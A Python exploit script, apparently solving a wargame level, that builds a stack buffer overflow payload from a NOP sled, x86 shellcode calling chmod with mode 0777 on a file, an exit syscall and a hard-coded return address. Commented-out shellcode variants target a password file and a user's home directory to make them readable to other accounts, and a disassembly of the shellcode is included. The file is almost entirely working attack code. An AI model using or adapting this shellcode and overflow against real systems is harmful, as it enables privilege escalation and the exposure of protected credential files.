import struct
import sys

ADDR_GETS = 0xffffddc0


# we ll use an other one to chmod the password file to all users so we can read it with lv4

# payload="
# \x89\xc3\x31\xd8\x50\xbe\x3e\x1f
# \x3a\x56\x81\xc6\x23\x45\x35\x21
# \x89\x74\x24\xfc\xc7\x44\x24\xf8
# \x2f\x2f\x73\x68\xc7\x44\x24\xf4
# \x2f\x65\x74\x63\x83\xec\x0c\x89
# \xe3\x66\x68\xff\x01\x66\x59\xb0
# \x0f\xcd\x80
# "


filename="//home//users//level05//"

parts=[filename[i:i+4] for i in range(0, len(filename), 4)]

# parts_encoded = ''.join([f"\x68{part}" for part in parts[::-1]]).encode("ascii")
#
#payload=b"\x31\xc0\x50"+parts_encoded+b"\x89\xe3\x66\xb9\xff\x01\xb0\x0f\xcd\x80"
exit_properly=b"\x31\xc0\x40\x31\xdb\xcd\x80"

payload=b"\x31\xc0\x50\x68\x2f\x61\x62\x63\x68\x2f\x74\x6d\x70\x89\xe3\x66\xb9\xff\x01\xb0\x0f\xcd\x80" #23 long
payload+=exit_properly


exploit=b"\x90"*(156-len(payload))
exploit+=payload
exploit+=b"\xa0\xd6\xff\xff"
sys.stdout.buffer.write(exploit)

# 00000000 <_start>:
#    0:	31 c0                	xor    %eax,%eax
#    2:	50                   	push   %eax
#    3:	68 2f 61 62 63       	push   $0x6362612f
#    8:	68 2f 74 6d 70       	push   $0x706d742f
#    d:	89 e3                	mov    %esp,%ebx
#    f:	66 b9 ff 01          	mov    $0x1ff,%cx
#   13:	b0 0f                	mov    $0xf,%al
#   15:	cd 80                	int    $0x80
# exit properly
# 80480a0:   31 c0                   xor    %eax,%eax
# 80480a2:   40                      inc    %eax
# 80480a3:   31 db                   xor    %ebx,%ebx
# 80480a5:   cd 80                   int    $0x80
#
